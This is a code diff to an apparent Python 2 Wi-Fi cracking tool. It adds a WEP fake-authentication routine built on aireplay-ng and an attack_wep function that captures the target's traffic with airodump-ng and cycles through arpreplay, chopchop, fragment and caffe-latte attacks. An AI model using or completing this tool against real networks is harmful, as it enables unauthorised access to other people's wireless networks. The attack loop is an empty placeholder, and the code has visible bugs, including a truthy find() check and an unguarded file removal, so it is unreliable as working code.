@@ -763,12 +763,69 @@ def attack_wpa(iface, target, clients):
 	return got_handshake
 
 
+def wep_fake_auth(iface, target):
+	"""
+		Attempt to (falsely) authenticate with a WEP access point.
+		Gives 10 seconds to make 5 authentication attempts.
+		Returns True if authentication was successful, False otherwise.
+	"""
+	max_wait = 10
+	cmd = ['aireplay-ng',
+	       '-1', '0',          # Fake authentication, no delay
+	       '-a', target.bssid,
+	       '-T', '5',          # Make 5 attempts
+	       iface]
+	proc_fakeauth = Popen(cmd, stdout=PIPE, stderr=DN)
+	started = time.time()
+	while proc_fakeauth.poll() == None and time.time() - started <= max_wait:  pass
+	if time.time() - started > max_wait: 
+		try: os.kill(proc_fakeauth.pid, SIGINT)
+		except OSError: pass
+		print ' unable to fake-authenticate with target'
+		print ' to skip this speed bump, select "ignore-fake-auth" at command-line'
+		return False
+	
+	result = proc_fakeauth.communicate()[0].lower()
+	if result.find('switching to shared key') != -1 or \
+	   result.find('rejects open system'): pass
+	   # TODO Shared Key Authentication (SKA)
+	   	
+	return result.find('association successful') != -1
+
+
 def attack_wep(iface, target, clients):
 	"""
 		Attacks WEP-encrypted network.
+		Returns True if key was successfully found, False otherwise.
 	"""
+	os.remove(temp + 'wepkey.txt')
 	
-	pass
+	# Start airodump process to capture packets
+	cmd = ['airodump-ng',
+	       '-w', temp + 'wep',      # Output file name (for wep-01.cap, wep-01.csv)
+	       '-c', target.channel,    # Wireless channel
+	       '--bssid', target.bssid,
+	       iface]
+	proc_airodump = Popen(cmd, stdout=DN, stderr=DN)
+	
+	client_mac = ''
+	try:
+		if wep_fake_auth(iface, target): client_mac = THIS_MAC
+		elif not IGNORE_FAKE_AUTH: return False
+	
+		wep_attacks = ['arpreplay', 'chopchop', 'fragment']
+		if len(clients) > 0: 
+			wep_attacks.append('caffe-latte')
+			client_mac = clients[0].bssid
+		
+		for attack in wep_attacks:
+			# Start process
+			time_started = time.time()
+			while time.time() - time_started < WEP_ATTACK_TIMEOUT:
+				pass
+	except KeyboardInterrupt:
+		print '\n ^C Interrupted'		
+		
 
 
 def main():
